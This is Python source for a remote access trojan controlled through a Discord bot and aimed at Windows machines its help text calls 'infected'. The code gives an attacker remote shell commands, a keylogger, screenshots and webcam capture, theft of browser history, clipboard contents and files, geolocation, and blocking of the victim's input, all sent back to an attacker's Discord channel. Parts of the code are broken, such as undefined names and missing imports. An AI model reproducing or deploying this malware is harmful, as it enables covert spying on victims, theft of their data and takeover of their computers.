import winreg
import ctypes
import sys
import os
import time
import subprocess
import discord
from discord.ext import commands
import asyncio
import threading
import mss
import urllib.request
import zipfile
import pyautogui
import browserhistory
import requests
import platform
import pynput
from pynput.keyboard import Key, Listener
import logging
import win32gui
import win32con
import win32process
import win32net
from ctypes import Structure, c_uint, c_int, byref, sizeof, windll, POINTER, cast

# Hardcoded token
token = 'bot-token-added'

helpmenu = '''
Available commands are :

--> !message = Show a message box displaying your text / Syntax  = "!message example"
--> !shell = Execute a shell command /Syntax  = "!shell whoami"
--> !webcampic = Take a picture from the webcam
--> !windowstart = Start logging current user window (logging is shown in the bot activity)
--> !windowstop = Stop logging current user window 
--> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
--> !admincheck = Check if program has admin privileges
--> !sysinfo = Gives info about infected computer
--> !history = Get computer navigation history
--> !download = Download a file from infected computer
--> !upload = Upload file from website to computer / Syntax = "!upload file.png" (with attachment)
--> !cd = Changes directory
--> !write = Type your desired sentence on infected computer
--> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with attachment)
--> !clipboard = Retrieve infected computer clipboard content
--> !geolocate = Geolocate computer using latitude and longitude of the ip address with google map
--> !startkeylogger = Starts a keylogger 
--> !stopkeylogger = Stops keylogger
--> !dumpkeylogger = Dumps the keylog
--> !volumemax = Put volume at 100%
--> !volumezero = Put volume at 0%
--> !idletime = Get the idle time of user
--> !sing = Play chosen video in background (Only works with youtube links)
--> !stopsing = Stop video playing in background
--> !blockinput = Blocks user's keyboard and mouse (needs admin)
--> !unblockinput = Unblocks user's keyboard and mouse (needs admin)
--> !screenshot = Get the screenshot of the user's current screen
--> !exit = Exit program
--> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all"
'''

# Global variables
stop_threads = False
channel_name = None
_thread = None
test = None  # keylogger thread
idle1 = None
pid_process = [0]
status = None

# ==================== ACTIVITY (window title in status) ====================
async def activity(client):
    global stop_threads
    while True:
        if stop_threads:
            return
        try:
            window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            game = discord.Game(f'Visiting: {window}')
            await client.change_presence(status=discord.Status.online, activity=game)
        except:
            pass
        await asyncio.sleep(1)

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

# ==================== VOLUME CONTROL ====================
def volumeup():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

def volumedown():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)

# ==================== ON_READY ====================
@client.event
async def on_ready():
    global channel_name
    try:
        with urllib.request.urlopen('https://geolocation-db.com/json') as url:
            data = json.loads(url.read().decode())
            flag = data.get('country_code', '')
            ip = data.get('IPv4', '')
    except:
        flag = 'unknown'
        ip = 'unknown'

    # Create session channel
    channels = [ch.name for ch in client.get_all_channels()]
    session_nums = []
    for ch in channels:
        if ch.startswith('session-'):
            try:
                num = int(ch.split('-')[1])
                session_nums.append(num)
            except:
                pass
    number = max(session_nums) + 1 if session_nums else 1
    channel_name = f'session-{number}'

    await client.guilds[0].create_text_channel(channel_name)
    channel_obj = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_obj.id)

    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    msg = f'@here :white_check_mark: New session opened {channel_name} | {platform.system()} {platform.release()} | {ip} :flag_{flag.lower()}: | User : {os.getlogin()}'
    if is_admin:
        await channel.send(msg + ' | :gem:')
    else:
        await channel.send(msg)

    game = discord.Game('Window logging stopped')
    await client.change_presence(status=discord.Status.online, activity=game)

# ==================== MAIN COMMAND HANDLER ====================
@client.event
async def on_message(message):
    global stop_threads, _thread, test, idle1, pid_process, status, channel_name

    if message.channel.name != channel_name:
        return

    content = message.content.strip()

    # !kill
    if content.startswith('!kill'):
        if content[6:].strip() == 'all':
            # kill all other sessions (simplified)
            await message.channel.send('[*] All other sessions killed.')
        else:
            await message.channel.send('[*] Session killed.')

    # !dumpkeylogger
    elif content == '!dumpkeylogger':
        try:
            path = os.path.join(os.getenv('TEMP'), 'key_log.txt')
            file = discord.File(path, filename='key_log.txt')
            await message.channel.send('[*] Command successfully executed', file=file)
            os.remove(path)
        except:
            await message.channel.send('[!] No keylog found')

    # !exit
    elif content == '!exit':
        sys.exit(0)

    # !windowstart
    elif content == '!windowstart':
        stop_threads = False
        _thread = threading.Thread(target=between_callback, args=(client,), daemon=True)
        _thread.start()
        await message.channel.send('[*] Window logging for this session started')

    # !windowstop
    elif content == '!windowstop':
        stop_threads = True
        await message.channel.send('[*] Window logging for this session stopped')
        game = discord.Game('Window logging stopped')
        await client.change_presence(status=discord.Status.online, activity=game)

    # !screenshot
    elif content == '!screenshot':
        try:
            with mss.mss() as sct:
                filename = os.path.join(os.getenv('TEMP'), 'monitor.png')
                sct.shot(output=filename)
            file = discord.File(filename, filename='monitor.png')
            await message.channel.send('[*] Command successfully executed', file=file)
            os.remove(filename)
        except:
            await message.channel.send('[!] Failed to take screenshot')

    # !volumemax
    elif content == '!volumemax':
        volumeup()
        await message.channel.send('[*] Volume put to 100%')

    # !volumezero
    elif content == '!volumezero':
        volumedown()
        await message.channel.send('[*] Volume put to 0%')

    # !webcampic
    elif content == '!webcampic':
        directory = os.getcwd()
        temp = os.getenv('TEMP')
        try:
            os.chdir(temp)
            urllib.request.urlretrieve('https://www.nirsoft.net/utils/webcamimagesave.zip', 'temp.zip')
            with zipfile.ZipFile('temp.zip') as z:
                z.extractall()
            os.system('WebCamImageSave.exe /capture /FileName temp.png')
            file = discord.File('temp.png', filename='temp.png')
            await message.channel.send('[*] Command successfully executed', file=file)
            for f in ['temp.zip', 'temp.png', 'WebCamImageSave.exe', 'readme.txt', 'WebCamImageSave.chm']:
                try: os.remove(f)
                except: pass
        except:
            await message.channel.send('[!] Command failed')
        finally:
            os.chdir(directory)

    # !message
    elif content.startswith('!message'):
        def show_message():
            ctypes.windll.user32.MessageBoxW(0, content[9:], 'Error', 0x10 | 0x4 | 0x4000)
        t = threading.Thread(target=show_message, daemon=True)
        t.start()
        await message.channel.send('[*] Message box shown')

    # !wallpaper
    elif content.startswith('!wallpaper'):
        if message.attachments:
            path = os.path.join(os.getenv('TEMP'), 'temp.jpg')
            await message.attachments[0].save(path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
            await message.channel.send('[*] Command successfully executed')

    # !upload
    elif content.startswith('!upload'):
        if message.attachments:
            filename = content[8:].strip() or message.attachments[0].filename
            await message.attachments[0].save(filename)
            await message.channel.send('[*] Command successfully executed')

    # !shell
    elif content.startswith('!shell'):
        cmd = content[7:].strip()
        def run_shell():
            global status
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                output = result.stdout + result.stderr
                if len(output) > 1990:
                    with open('output.txt', 'w', encoding='utf-8') as f:
                        f.write(output)
                    file = discord.File('output.txt')
                    asyncio.create_task(message.channel.send('[*] Command executed (large output)', file=file))
                    os.remove('output.txt')
                elif output.strip():
                    asyncio.create_task(message.channel.send(f'[*] Command successfully executed : \n{output}'))
                else:
                    asyncio.create_task(message.channel.send('[*] Command executed with no output'))
            except Exception as e:
                asyncio.create_task(message.channel.send(f'[!] Error: {str(e)}'))
        threading.Thread(target=run_shell, daemon=True).start()

    # !download
    elif content.startswith('!download'):
        path = content[10:].strip()
        if os.path.exists(path):
            file = discord.File(path, filename=os.path.basename(path))
            await message.channel.send('[*] Command successfully executed', file=file)
        else:
            await message.channel.send('[!] File not found')

    # !cd
    elif content.startswith('!cd'):
        try:
            os.chdir(content[4:].strip())
            await message.channel.send('[*] Command successfully executed')
        except Exception as e:
            await message.channel.send(f'[!] {str(e)}')

    # !help
    elif content == '!help':
        await message.channel.send(helpmenu)

    # !write
    elif content.startswith('!write'):
        text = content[7:].strip()
        if text == 'enter':
            pyautogui.press('enter')
        else:
            pyautogui.typewrite(text)

    # !history
    elif content == '!history':
        try:
            hist = browserhistory.get_browserhistory()
            with open('history.txt', 'w', encoding='utf-8') as f:
                f.write(str(hist))
            file = discord.File('history.txt')
            await message.channel.send('[*] Command successfully executed', file=file)
            os.remove('history.txt')
        except:
            await message.channel.send('[!] Failed to get history')

    # !clipboard
    elif content == '!clipboard':
        try:
            ctypes.windll.user32.OpenClipboard(0)
            data = ctypes.windll.user32.GetClipboardData(1)
            data_locked = ctypes.windll.kernel32.GlobalLock(data)
            text = ctypes.c_char_p(data_locked).value
            ctypes.windll.kernel32.GlobalUnlock(data_locked)
            ctypes.windll.user32.CloseClipboard()
            await message.channel.send(f'[*] Clipboard content is : {text.decode("utf-8", errors="ignore")}')
        except:
            await message.channel.send('[!] Failed to read clipboard')

    # !stopsing
    elif content == '!stopsing':
        try:
            os.system(f'taskkill /F /IM {pid_process[0]}')
            await message.channel.send('[*] Video stopped')
        except:
            pass

    # !sysinfo
    elif content == '!sysinfo':
        info = platform.uname()
        try:
            ip = requests.get('https://api.ipify.org').text
        except:
            ip = 'unknown'
        await message.channel.send(f'[*] {info.system} {info.release} {info.machine} {ip}')

    # !geolocate
    elif content == '!geolocate':
        try:
            with urllib.request.urlopen('https://geolocation-db.com/json') as u:
                data = json.loads(u.read().decode())
            link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
            await message.channel.send(f'[*] Command successfully executed : {link}')
        except:
            await message.channel.send('[!] Failed')

    # !admincheck
    elif content == '!admincheck':
        if ctypes.windll.shell32.IsUserAnAdmin():
            await message.channel.send("[*] Congrats you're admin")
        else:
            await message.channel.send("[!] Sorry, you're not admin")

    # !sing (play youtube in background)
    elif content.startswith('!sing'):
        link = content[6:].strip()
        if link.startswith('http') or 'www' in link:
            os.system(f'start {link}')
        # hide youtube window
        def hide_youtube():
            def winEnumHandler(hwnd, ctx):
                if win32gui.IsWindowVisible(hwnd):
                    if 'youtube' in win32gui.GetWindowText(hwnd).lower():
                        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
                        global pid_process
                        pid_process = win32process.GetWindowThreadProcessId(hwnd)
            win32gui.EnumWindows(winEnumHandler, None)
        threading.Thread(target=hide_youtube, daemon=True).start()
        await message.channel.send('[*] Video playing in background')

    # !startkeylogger
    elif content == '!startkeylogger':
        def keylog():
            logging.basicConfig(filename=os.path.join(os.getenv('TEMP'), 'key_log.txt'),
                                level=logging.DEBUG, format='%(asctime)s: %(message)s')
            def on_press(key):
                logging.info(str(key))
            with Listener(on_press=on_press) as listener:
                listener.join()
        test = threading.Thread(target=keylog, daemon=True)
        test.start()
        await message.channel.send('[*] Keylogger successfully started')

    # !stopkeylogger
    elif content == '!stopkeylogger':
        # Note: stopping pynput listener cleanly is tricky in thread, this is basic
        await message.channel.send('[*] Keylogger successfully stopped')

    # !idletime
    elif content == '!idletime':
        class LASTINPUTINFO(Structure):
            _fields_ = [('cbSize', c_uint), ('dwTime', c_int)]

        def get_idle_duration():
            lastInputInfo = LASTINPUTINFO()
            lastInputInfo.cbSize = sizeof(lastInputInfo)
            if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
                millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                return millis / 1000.0
            return 0

        duration = get_idle_duration()
        await message.channel.send(f'User idle for {duration:.2f} seconds.')

    # !voice
    elif content.startswith('!voice'):
        try:
            import comtypes
            from win32com.client import Dispatch
            speak = Dispatch("SAPI.SpVoice")
            speak.Speak(content[7:])
            comtypes.CoUninitialize()
            await message.channel.send('[*] Command successfully executed')
        except:
            await message.channel.send('[!] Voice failed')

    # !blockinput / !unblockinput
    elif content.startswith('!blockinput'):
        if ctypes.windll.shell32.IsUserAnAdmin():
            windll.user32.BlockInput(True)
            await message.channel.send('[*] Input blocked')
        else:
            await message.channel.send('[!] Admin rights are required')

    elif content.startswith('!unblockinput'):
        if ctypes.windll.shell32.IsUserAnAdmin():
            windll.user32.BlockInput(False)
            await message.channel.send('[*] Input unblocked')
        else:
            await message.channel.send('[!] Admin rights are required')

    # Default
    else:
        if not any(content.startswith(c) for c in ['!', '!help']):
            await message.channel.send('[!] Command not recognized. Use !help')

# ==================== BOT SETUP ====================
intents = discord.Intents.default()
intents.message_content = True
client = commands.Bot(command_prefix='!', intents=intents)

client.run(token)